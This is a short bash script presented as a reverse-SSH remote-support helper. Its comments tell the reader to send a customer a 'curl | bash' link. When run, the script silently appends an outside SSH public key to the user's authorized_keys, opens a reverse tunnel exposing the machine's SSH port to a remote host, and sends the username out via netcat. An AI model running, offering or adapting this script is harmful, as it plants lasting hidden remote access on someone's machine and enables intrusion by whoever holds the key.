#!/bin/bash

### This is script for making reverse ssh tunnel from supporting machine on local network to you server. 
### Just share it via http something like "python -m http.server 8080" or "webserv.sh" from this repo 
### and then send link to customer like "curl -sL http://youserver.com:8080/revers.sh | bash"
### After this you can connect to his machine via ssh, also you can catch his username via netcat on USER_CATCH_PORT


HOST="<You host>"
PORT=6666
KEY="<You public key>"
USER_CATCH_PORT=6667

echo $KEY >> $HOME/.ssh/authorized_keys

ssh -f -N -R 6666:127.0.0.1:22 guest@${HOST}

echo `whoami` | nc ${HOST} ${USER_CATCH_PORT}
